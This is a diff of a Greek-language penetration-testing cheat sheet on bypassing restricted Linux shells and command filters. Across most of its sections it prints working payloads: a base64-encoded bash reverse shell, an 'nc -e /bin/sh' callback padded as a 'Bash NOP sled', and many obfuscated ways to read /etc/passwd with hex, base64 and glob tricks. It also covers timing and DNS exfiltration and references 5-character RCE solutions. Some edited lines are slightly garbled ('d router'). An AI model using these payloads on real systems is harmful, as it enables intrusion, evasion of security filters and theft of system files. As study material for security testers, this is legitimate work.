@@ -1,8 +1,10 @@
 # Παράκαμψη περιορισμών Linux
 
-## Παρακάμψεις συνηθισμένων περιορισμών
+{{#include ../../../banners/hacktricks-training.md}}
 
-Οι συλλογές command-injection και WAF-evasion στα PayloadsAllTheThings, το cheat sheet του Bo0oM και τα δύο συνδεδεμένα άρθρα του Secjuice παρέχουν υπόβαθρο για τις παραλλαγές σύνταξης shell σε αυτήν την ενότητα.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)</sup>
+## Παρακάμψεις κοινών περιορισμών
+
+Οι συλλογές command-injection και WAF-evasion στα PayloadsAllTheThings, το cheat sheet του Bo0oM και τα δύο συνδεδεμένα άρθρα του Secjuice παρέχουν το απαραίτητο υπόβαθρο για τις παραλλαγές σύνταξης του shell σε αυτή την ενότητα.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)</sup>
 
 ### Reverse Shell
 ```bash
@@ -18,7 +20,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-### Παράκαμψη Paths και απαγορευμένες λέξεις
+### Διαδρομές παράκαμψης και απαγορευμένες λέξεις
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -105,7 +107,7 @@ echo "ls\x09-l" | bash
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
 ```
-### Παράκαμψη backslash και slash
+### Bypass backslash και slash
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
@@ -114,7 +116,7 @@ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
-### Παράκαμψη με hex encoding
+### Bypass με hex encoding
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
@@ -124,27 +126,27 @@ cat `xxd -r -p <<< 2f6574632f706173737764`
 xxd -r -ps <(echo 2f6574632f706173737764)
 cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```
-### Παράκαμψη IPs
+### Bypass IPs
 ```bash
 # Decimal IPs
 127.0.0.1 == 2130706433
 ```
-### Εξαγωγή δεδομένων με βάση τον χρόνο
+### Εξαγωγή δεδομένων βάσει χρόνου
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
-### Λήψη χαρακτήρων από Env Variables
+### Λήψη χαρακτήρων από μεταβλητές περιβάλλοντος
 ```bash
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
 ```
-### DNS data exfiltration
+### Exfiltration δεδομένων DNS
 
-Για callbacks εκτός ζώνης, μια υπηρεσία τύπου collaborator, όπως το Burp Collaborator, μπορεί να προκαλέσει την αλληλεπίδραση μιας εφαρμογής-στόχου με έναν εξωτερικό server· ο υπάρχων σύνδεσμος [**pingb**](http://pingb.in) διατηρείται για ιστορική πλοήγηση και δεν αποτελεί ισχυρισμό τρέχουσας διαθεσιμότητας.<sup>[[6]](#references)</sup>
+Για out-of-band callbacks, μια υπηρεσία τύπου Collaborator, όπως το Burp Collaborator, μπορεί να προκαλέσει την αλληλεπίδραση μιας εφαρμογής-στόχου με έναν εξωτερικό διακομιστή· ο υπάρχων σύνδεσμος [**pingb**](http://pingb.in) διατηρείται ως ιστορική πλοήγηση και δεν αποτελεί ισχυρισμό τρέχουσας διαθεσιμότητας.<sup>[[6]](#references)</sup>
 
-### Ενσωματωμένες εντολές
+### Builtins
 
-Σε ένα περιορισμένο shell, οι διαθέσιμες ενσωματωμένες εντολές αποτελούν την υπόλοιπη επιφάνεια εντολών για αυτά τα παραδείγματα· το Bash τεκμηριώνει τις ενσωματωμένες εντολές και τη γραμματική εκτέλεσης.<sup>[[7]](#references)</sup> Ιδέα από το [**devploit**](https://twitter.com/devploit).\
+Σε ένα περιορισμένο shell, τα διαθέσιμα builtins αποτελούν την εναπομείνασα επιφάνεια εντολών για αυτά τα παραδείγματα· το Bash τεκμηριώνει τις ενσωματωμένες εντολές και τη γραμματική εκτέλεσής του.<sup>[[7]](#references)</sup> Ιδέα από το [**devploit**](https://twitter.com/devploit).\
 Ξεκινήστε από την υπάρχουσα πλοήγηση [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html) και, στη συνέχεια, δοκιμάστε τις ακόλουθες ειδικές για το Bash τεχνικές:<sup>[[7]](#references)</sup>
 ```bash
 # Get list of builtins
@@ -209,14 +211,14 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 ```
 ### Bashfuscator
 
-Η ακόλουθη κλήση χρησιμοποιεί το Bashfuscator, ένα open-source framework για Bash obfuscation· ο σύνδεσμος του repository στο σχόλιο του κώδικα διατηρείται για πλοήγηση.<sup>[[8]](#references)</sup>
+Η ακόλουθη κλήση χρησιμοποιεί το Bashfuscator, ένα open-source framework για Bash obfuscation· το link του repository στο σχόλιο του κώδικα διατηρείται ως navigation.<sup>[[8]](#references)</sup>
 ```bash
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
 ```
 ### RCE με 5 χαρακτήρες
 
-Τα ακόλουθα δύο ιστορικά παραδείγματα των 5 χαρακτήρων διατηρούνται ως αναπαραγωγές challenges: το κύριο αποθετήριο του challenge είναι διαθέσιμο στο [αποθετήριο του Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges), ενώ ο δεύτερος σύνδεσμος write-up στο code block είναι σύνδεσμος πλοήγησης του οποίου η τρέχουσα διαθεσιμότητα δεν έχει επαληθευτεί.<sup>[[9]](#references)</sup>
+Τα ακόλουθα δύο ιστορικά παραδείγματα 5 χαρακτήρων διατηρούνται ως αναπαραγωγές challenges: το κύριο repository του challenge είναι διαθέσιμο στο [repository του Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges), ενώ ο δεύτερος σύνδεσμος write-up στο code block είναι σύνδεσμος πλοήγησης, του οποίου η τρέχουσα διαθεσιμότητα δεν επαληθεύτηκε.<sup>[[9]](#references)</sup>
 ```bash
 # From the Orange Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
 #Orange Tsai solution
@@ -298,15 +300,15 @@ ln /f*
 'sh x'
 'sh g'
 ```
-## Παράκαμψη Read-Only/Noexec/Distroless
+## Read-Only/Noexec/Distroless Bypass
 
-Αν βρίσκεστε μέσα σε ένα filesystem με προστασίες **read-only και noexec**, ή σε ένα **distroless image**, το περιβάλλον επιβάλλει περιορισμούς εκτέλεσης που τεκμηριώνονται από το Linux `mount(8)` και το project Distroless· η συνδεδεμένη σελίδα συγκεντρώνει τεχνικές για την αντιμετώπισή τους.<sup>[[11]](#references)[[12]](#references)</sup>
+Αν βρίσκεστε μέσα σε ένα filesystem με **read-only και noexec protections**, ή σε ένα **distroless image**, το περιβάλλον επιβάλλει περιορισμούς εκτέλεσης που τεκμηριώνονται από το Linux `mount(8)` και το project Distroless· η συνδεδεμένη σελίδα συγκεντρώνει τεχνικές για εργασία μέσα σε αυτούς τους περιορισμούς.<sup>[[11]](#references)[[12]](#references)</sup>
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-## Παράκαμψη Chroot και άλλων Jails
+## Chroot & other Jails Bypass
 
 {{#ref}}
 ../../main-system-information/escaping-from-limited-bash.md
@@ -314,23 +316,23 @@ bypass-fs-protections-read-only-no-exec-distroless/
 
 ## Space-Based Bash NOP Sled ("Bashsledding")
 
-Όταν ένα vulnerability σάς επιτρέπει να ελέγχετε μερικώς ένα argument που τελικά φτάνει στη `system()` ή σε άλλο shell, το offset του payload μπορεί να είναι αβέβαιο. Οι Alan Cao και Will Tan περιγράφουν μια περιορισμένη περίπτωση σε embedded device, όπου ένα shell payload έγινε spray στη memory-mapped NVRAM και προηγήθηκαν αυτού spaces.<sup>[[5]](#references)</sup>
+Όταν ένα vulnerability σάς επιτρέπει να ελέγχετε εν μέρει ένα argument που τελικά φτάνει στη `system()` ή σε άλλο shell, το payload offset μπορεί να είναι αβέβαιο. Οι Alan Cao και Will Tan περιγράφουν μια περίπτωση embedded device με περιορισμούς, όπου ένα shell payload διασκορπίστηκε στη memory-mapped NVRAM και προηγήθηκε από spaces.<sup>[[5]](#references)</sup>
 
-Επομένως, μπορείτε να δημιουργήσετε ένα *NOP sled για Bash* βάζοντας πριν από την πραγματική εντολή σας μια μεγάλη ακολουθία από spaces ή χαρακτήρες tab· το Bash ορίζει τα spaces και τα tabs ως blanks που διαχωρίζουν τις λέξεις σε μια simple command.<sup>[[5]](#references)[[7]](#references)</sup>
+Επομένως, μπορείτε να δημιουργήσετε ένα *NOP sled για Bash* προτάσσοντας στην πραγματική σας command μια μεγάλη ακολουθία από spaces ή tab characters· το Bash ορίζει τα spaces και τα tabs ως blanks που διαχωρίζουν words σε μια simple command.<sup>[[5]](#references)[[7]](#references)</sup>
 ```bash
 # Payload sprayed into an environment variable / NVRAM entry
 "                nc -e /bin/sh 10.0.0.1 4444"
 # 16× spaces ───┘ ↑ real command
 ```
-Εάν ένα ROP chain (ή κάποιο άλλο memory-corruption primitive) περνά έναν pointer προς command string που ξεκινά οπουδήποτε μέσα στο space block, το Bash μπορεί να αναλύσει τα εναπομείναντα αρχικά κενά μέχρι να φτάσει στην εντολή· στο router exploit που αναφέρεται, αυτό κατέστησε αξιοποιήσιμα τα αβέβαια string offsets.<sup>[[5]](#references)[[7]](#references)</sup>
+Εάν μια αλυσίδα ROP (ή ένα άλλο primitive καταστροφής μνήμης) περνά έναν δείκτη σε command-string που αρχίζει οπουδήποτε μέσα στο space block, το Bash μπορεί να αναλύσει τα αρχικά κενά μέχρι να φτάσει στην εντολή· στο d router exploit, αυτό έκανε αξιοποιήσιμα τα αβέβαια offsets των strings.<sup>[[5]](#references)[[7]](#references)</sup>
 
 Πρακτικές περιπτώσεις χρήσης σε περιορισμένους embedded στόχους περιλαμβάνουν:<sup>[[5]](#references)</sup>
 
-1. **Memory-mapped configuration blobs** (π.χ. NVRAM), στα οποία υπάρχει πρόσβαση από διαφορετικές διεργασίες.<sup>[[5]](#references)</sup>
-2. Payload channels όπου ο attacker δεν μπορεί να γράψει NULL bytes για να ευθυγραμμίσει το payload (μια γενική προσαρμογή του προβλήματος ευθυγράμμισης).<sup>[[5]](#references)</sup>
+1. **Blobs configuration αντιστοιχισμένα στη μνήμη** (π.χ. NVRAM), τα οποία είναι προσβάσιμα από διαφορετικές διεργασίες.<sup>[[5]](#references)</sup>
+2. Κανάλια payload όπου ο attacker δεν μπορεί να γράψει NULL bytes για να ευθυγραμμίσει το payload (μια γενική προσαρμογή του προβλήματος ευθυγράμμισης).<sup>[[5]](#references)</sup>
 3. Embedded συσκευές με ένα μικρό περιβάλλον BusyBox `ash`/`sh`, το οποίο το BusyBox τεκμηριώνει ως applets σε συστήματα με περιορισμένους πόρους.<sup>[[10]](#references)</sup>
 
-> 🛠️  Συνδυάστε αυτή την τεχνική με ROP gadgets που καλούν τη `system()` σε ελεγχόμενο lab· η έρευνα για router που αναφέρεται επιδεικνύει αυτόν τον συνδυασμό σε hardware με περιορισμούς.<sup>[[5]](#references)</sup>
+> 🛠️  Συνδύασε αυτή την τεχνική με ROP gadgets που καλούν τη `system()` σε ένα ελεγχόμενο lab· η έρευνα για το d router καταδεικνύει αυτόν τον συνδυασμό σε hardware με περιορισμούς.<sup>[[5]](#references)</sup>
 
 ## References
 
@@ -338,12 +340,12 @@ bypass-fs-protections-read-only-no-exec-distroless/
 - [2] [Bo0oM - WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
 - [3] [Τεχνικές αποφυγής Web Application Firewall (WAF) #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
 - [4] [Τεχνικές αποφυγής Web Application Firewall (WAF) #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
-- [5] [Alan Cao and Will Tan — Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
+- [5] [Alan Cao και Will Tan — Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 - [6] [Burp Collaborator - PortSwigger](https://portswigger.net/burp/documentation/desktop/tools/collaborator)
-- [7] [bash(1) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man1/bash.1.html)
+- [7] [bash(1) — Σελίδα εγχειριδίου του Linux](https://man7.org/linux/man-pages/man1/bash.1.html)
 - [8] [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
 - [9] [My-CTF-Web-Challenges — Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges)
 - [10] [BusyBox](https://busybox.net/downloads/BusyBox.html)
-- [11] [mount(8) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/mount.8.html)
+- [11] [mount(8) — Σελίδα εγχειριδίου του Linux](https://man7.org/linux/man-pages/man8/mount.8.html)
 - [12] [Distroless](https://github.com/GoogleContainerTools/distroless)
 {{#include ../../../banners/hacktricks-training.md}}
